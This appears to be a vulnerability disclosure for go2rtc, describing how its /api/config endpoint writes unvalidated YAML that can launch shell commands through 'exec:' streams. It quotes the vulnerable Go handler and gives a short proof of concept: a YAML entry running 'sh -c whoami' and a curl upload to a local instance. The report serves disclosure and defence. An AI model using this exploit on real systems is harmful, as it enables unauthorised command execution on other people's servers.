# Go2RTC Remote Code Execution

## 1.Description
The Go2RTC configuration management API endpoint (/api/config) contains an arbitrary configuration write vulnerability. Authenticated attackers can submit malicious YAML configurations through this endpoint, bypassing semantic validation and writing dangerous configurations to the system. When the system loads these configurations and accesses the associated streams, arbitrary system commands can be executed through the `exec:` protocol, leading to remote code execution (RCE).

## 2.Affected Versions
All versions of go2rtc that include the configuration API endpoint with the described behavior.

## 3. Root Cause
### 3.1 Fundamental Cause
The root cause of the vulnerability lies in the `configHandler` function in the `internal/api/config.go` file, which lacks semantic validation of configuration content. The system only validates the correctness of YAML syntax but does not check the security of the configuration content.

### 3.2 Vulnerable Code Analysis
```go
// Fragment of configHandler function in internal/api/config.go
case "POST", "PATCH":
    // Read raw user input without content validation
    data, err := io.ReadAll(r.Body)
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }

    if r.Method == "PATCH" {
        // Merge YAML without content validation
        data, err = mergeYAML(app.ConfigPath, data)
        if err != nil {
            http.Error(w, err.Error(), http.StatusBadRequest)
            return
        }
    } else {
        // Only validate YAML syntax, not content security
        if err = yaml.Unmarshal(data, map[string]any{}); err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
    }

    // Directly write unvalidated configuration file
    if err = os.WriteFile(app.ConfigPath, data, 0644); err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }
```

### 3.3 Execution Chain
1. Attacker sends malicious YAML configuration to `/api/config`
2. Server only validates YAML syntax, not content security
3. Malicious configuration is directly written to configuration file
4. System registers `exec:` protocol handler when loading new configuration
5. Command execution is triggered when user accesses stream

## 4.PoC
Step 1: Create malicious configuration
   ```malicious_config.yaml
   streams:
     malicious_stream: exec:sh -c "whoami>/tmp/poc1.txt"
   ```
Step 2: Upload malicious configuration
```
curl -X POST "http://localhost:1984/api/config" \
  -H "Content-Type: application/yaml" \
  -d "$(cat malicious_config1.yaml)" \
  -w "HTTP Status: %{http_code}\n"
```

## 5. Vulnerability Impact

- **Remote Code Execution**: Attackers can execute arbitrary system commands
- **Privilege Escalation**: Commands execute with Go2RTC process privileges
- **Persistent Access**: Configuration changes persist after system reboot
- **Data Leakage**: Access to sensitive system files and data
- **Service Denial**: Resource exhaustion commands can cause service disruption

---------------------
#### Link: https://github.com/AlexxIT/go2rtc/issues/1878
